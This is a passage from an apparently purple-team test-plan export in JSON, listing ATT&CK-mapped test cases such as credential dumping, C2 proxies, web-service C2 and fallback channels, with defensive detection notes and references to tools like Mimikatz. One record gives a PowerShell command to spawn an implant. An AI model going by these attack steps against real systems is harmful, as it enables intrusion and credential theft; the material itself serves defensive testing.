memory.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["740b39a7-cf4c-4c2d-acf1-585754a5b04f","b17a2f33-8d65-4ace-800c-be60f1dd22a9","3883d65a-3ad2-4111-92fa-19a5d39a119d","8e4883bf-d7b7-40ac-b157-ab6431c02b03","76ca4ddf-5174-57a7-2842-70d5af62a25c","5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22","relationship--5fd13ed0-28df-4131-a653-0fa5a760ff95","relationship--a6f27258-cf6a-4d75-a3f0-5de085d528d2","course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1","relationship--a266294c-18a7-4a6e-8291-a901748c929c","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--ef79ec2f-fd7f-4f0b-851c-d215693987be","course-of-action--aeff5887-8f9e-48d5-a523-9b395e2ce80a","relationship--7e8ca453-aee5-48c1-a891-f44a742a95ed","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--fc31837d-530f-45e5-b9f8-bf6268c3ef03","course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462","relationship--7a3426bf-1751-43db-b844-6bf388a4c817","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","relationship--fe849763-78b9-4b8a-9219-2781ac7b00e8","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--ee8ef62a-fcde-44b0-aa63-4028dad703aa","course-of-action--49c06d54-9002-491d-9147-8efb537fbd26","tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d","relationship--3837e91f-47d5-4b30-b11b-76a91450c4ef","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--7ebe873c-07f5-43a7-a59f-9305f9ec55a5","tool--b76b2d94-60e4-4107-a903-4a3a7622fb3b","relationship--43619944-94e9-43d9-a761-8e4db2113eef","tool--4b57c098-f043-4da2-83ef-7588a6d426bc","relationship--8c1446c4-66b2-4b70-96df-7fd2414522be","tool--afc079f3-c0ea-4096-b75d-3f05338b7f60","relationship--b7930db8-2cb9-4ecf-b3d3-7425f99140d8","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--d5edf7fa-6d2b-4af8-a1d3-e0f9fe56eb00","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: GitHub LaZange Dec 2018)","(Citation: Github PowerShell Empire)","Ackerman, G., et al. (2018, December 21). OVERRULED: Containing a Potentially Destructive Adversary. Retrieved January 17, 2019. https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html","Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018. https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html","Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015. https://github.com/gentilkiwi/mimikatz","Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017. https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump","Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018. https://github.com/Neohapsis/creddump7","Frecn, D.. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019. https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea","Graeber, M. (2014, July 8). PowerSploit. Retrieved February 6, 2018. http://www.powershellmagazine.com/2014/07/08/powersploit/","Grafnetter, M. (2015, October 26). Retrieving DPAPI Backup Keys from Active Directory. Retrieved December 19, 2017. https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/","Lich, B. (2016, May 31). Protect derived domain credentials with Credential Guard. Retrieved June 1, 2016. https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard","Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015. https://adsecurity.org/?page_id=1821","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017. https://adsecurity.org/?p=1729","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017. https://adsecurity.org/?p=1729","Microsoft. (2008, July 25). Credential Security Service Provider and SSO for Terminal Services Logon. Retrieved April 11, 2018. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749211(v=ws.10)","Microsoft. (2012, November 29). Using security policies to restrict NTLM traffic. Retrieved December 4, 2017. https://technet.microsoft.com/library/jj865668.aspx","Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved February 13, 2015. https://technet.microsoft.com/en-us/library/dn408187.aspx","Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc228086.aspx","Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017. https://msdn.microsoft.com/library/cc237008.aspx","Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018. https://msdn.microsoft.com/library/cc422924.aspx","Microsoft. (n.d.). How to grant the \"Replicating Directory Changes\" permission for the Microsoft Metadirectory Services ADMA service account. Retrieved December 4, 2017. https://support.microsoft.com/help/303972/how-to-grant-the-replicating-directory-changes-permission-for-the-micr","Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017. https://msdn.microsoft.com/library/dd207691.aspx","Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc245496.aspx","NSA IAD. (2017, April 20). Secure Host Baseline - Credential Guard. Retrieved April 25, 2017. https://github.com/iadgov/Secure-Host-Baseline/tree/master/Credential%20Guard","Nettitude. (2018, July 23). Python Server for PoshC2. Retrieved April 23, 2019. https://github.com/nettitude/PoshC2_Python","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Plett, C., Poggemeyer, L. (12, October 26). Securing Privileged Access Reference Material. Retrieved April 25, 2017. https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach","PowerShellMafia. (2012, May 26). PowerSploit - A PowerShell Post-Exploitation Framework. Retrieved February 6, 2018. https://github.com/PowerShellMafia/PowerSploit","PowerSploit. (n.d.). PowerSploit. Retrieved February 6, 2018. http://powersploit.readthedocs.io","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017. https://wiki.samba.org/index.php/DRSUAPI","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015. http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017. https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM","Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018. https://en.wikipedia.org/wiki/Active_Directory","Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018. https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/","Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017. https://source.winehq.org/WineAPI/samlib.html","Zanni, A. (n.d.). The LaZagne Project !!!. Retrieved December 14, 2018. https://github.com/AlessandroZ/LaZagne"],"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":["Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","### Windows\nMonitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [Valid Accounts](https://attack.mitre.org/techniques/T1078) if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access)\n\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA. (Citation: Microsoft LSA)\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. (Citation: TechNet Credential Guard) It also does not protect against all forms of credential dumping. (Citation: GitHub SHB Credential Guard)\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication. (Citation: AdSecurity DCSync Sept 2015) (Citation: Microsoft Replication ACL)\n\nConsider disabling or restricting NTLM traffic. (Citation: Microsoft Disable NTLM Nov 2012)\n\n### Linux\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to escalated privileges to avoid hostile programs from accessing such sensitive regions of memory.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc.","Set and enforce secure password policies for accounts.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--5e2bbd65-29b7-4b2c-998e-be4936032010","vectrId":"5e2bbd65-29b7-4b2c-998e-be4936032010","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"5e2bbd65-29b7-4b2c-998e-be4936032010","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Connection Proxy","variant":"MuddyWater - Connection Proxy","objective":"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the internet and then the proxy would forward communications to the C2 server.\n\nInternal connection proxies can be used to consolidate internal connections from compromised systems. Adversaries may use a compromised internal system as a proxy in order to conceal the true destination of C2 traffic. The proxy can redirect traffic from compromised systems inside the network to an external C2 server making discovery of malicious traffic difficult. Additionally, the network can be used to relay information from one system to another in order to avoid broadcasting traffic to all systems.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has controlled [POWERSTATS](https://attack.mitre.org/software/S0223) from behind a proxy network to obfuscate the C2 location.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea","relationship--cc78f0a1-7f4f-491e-a636-910f09d0c5a1","relationship--eede138c-9745-453c-a8b5-684b696c2ad0","course-of-action--d75a3d1b-b536-4f15-a23c-f4bcc17837b8","relationship--d50b5687-ea69-40f9-86f3-eecd7e015bac","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Symantec DeepSight Adversary Intelligence Team. (2018, December 10). Seedworm: Group Compromises Government Agencies, Oil & Gas, NGOs, Telecoms, and IT Firms. Retrieved December 14, 2018. https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group","Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015. http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/"],"mitreId":"T1090"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--640e2742-7072-4018-84b9-529ff01a70c3","vectrId":"640e2742-7072-4018-84b9-529ff01a70c3","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"640e2742-7072-4018-84b9-529ff01a70c3","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Redundant Access","variant":"OilRig - Redundant Access","objective":"Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. \n\nIf one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications.\n\nUse of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used [RGDoor](https://attack.mitre.org/software/S0258) via Web shell to establish redundant access. The group has also used harvested credentials to gain access to Internet-accessible resources such as Outlook Web Access, which could be used for redundant access.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--6aabc5ec-eae6-422c-8311-38d45ee9838a","relationship--d329d311-422b-4144-9212-aa7da4dc273a","relationship--3359cfe3-0d04-4fb8-9f2f-1b049bc10cf4","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--9691a6a8-12d0-45a7-8217-11d1793234cb","course-of-action--f9b3e5d9-7454-4b7d-bce6-27620e19924e","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016. https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/"],"mitreId":"T1108"},"blueTeam":{"successfulDetectionBehaviors":["Use intrusion detection signatures to block traffic at network boundaries.","Identify and block potentially malicious software that may be used as a remote access tool, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--64a053d1-c1fc-45b1-9106-180c761a2bba","vectrId":"64a053d1-c1fc-45b1-9106-180c761a2bba","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"64a053d1-c1fc-45b1-9106-180c761a2bba","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Web Service","variant":"Magic Hound - Web Service","objective":"Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.\n\nThese commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware can use a SOAP Web service to communicate with its C2 server.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.\n---\nWeb proxies can be used to enforce external network communication policy that prevents use of unauthorized external services.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--830c9528-df21-472c-8c14-a036bf17d665","relationship--79f89b33-046c-4bfa-a12d-c50fa0d84ea6","relationship--91af9744-413c-4e9c-bfdb-a9ca167e9bb5","course-of-action--4689b9fb-dca4-473e-831b-34717ad50c97","relationship--3024f916-b25c-4dd8-aab3-4d681b335da1","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--970635e8-9767-4654-b6ff-e1cd12bc206e","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/"],"mitreId":"T1102"},"blueTeam":{"successfulDetectionBehaviors":["Firewalls and Web proxies can be used to enforce external network communication policy. It may be difficult for an organization to block particular services because so many of them are commonly used during the course of business.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol or encoded commands used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--66090e66-8d9e-4f9a-a2a8-17c6982a9690","vectrId":"66090e66-8d9e-4f9a-a2a8-17c6982a9690","name":"","offset":0,"createTime":1.534359334442E12,"updateTime":1.578426099738E12,"phaseId":"1b7512d2-ec31-4fab-af57-4fec213b0ae8","templateId":"66090e66-8d9e-4f9a-a2a8-17c6982a9690","icon":"icons/terminal-blue.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Trusted Windows Binary","variant":"Process Creation Using PowerShell","objective":"Spawn a new implant process using stageless PowerShell script","command":"powershell.exe .\\script.ps1","likelihood":"Low","risk":"Low","internalExternal":"Internal","stealth":"Low","attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["bc5080df-ad46-8c5a-9f23-12f61d2ec5e6","9d8e81e7-127f-464e-8671-bfdc6cced3d5"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[],"references":[],"mitreId":"T1086"},"blueTeam":{"successfulDetectionBehaviors":["1) Suspicious process execution is blocked by EDR or other endpoint security tool"],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a","765c22af-e010-4b4d-9ba5-86e1ae6c916d","860cc9bc-4da2-4698-889b-e96cca9e4bf3"],"blueTeamProductIds":[],"outcomeNotes":"","trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--661b5f40-5d7d-447c-8fcc-8f0330518a17","vectrId":"661b5f40-5d7d-447c-8fcc-8f0330518a17","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"661b5f40-5d7d-447c-8fcc-8f0330518a17","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Fallback Channels","variant":"OilRig - Fallback Channels","objective":"Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.","command":"[OilRig](https://attack.mitre.org/groups/G0049) malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433","relationship--12daddcc-b964-485e-8c2d-10f554d78bcc","relationship--bb523d35-52f1-4c61-a8de-b4605ce9e596","course-of-action--515f6584-fa98-44fe-a4e8-e428c7188514","relationship--1469ff36-c655-4513-8ffa-81dcb55c4ae6","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Falcone, R. and Lee, B. (2017, July 27). OilRig Uses ISMDoor Variant; Possibly Linked to Greenbug Threat Group. Retrieved January 8, 2018. https://researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/","Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"],"mitreId":"T1008"},"blueTeam":{"successfulDetectionBehaviors":["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network 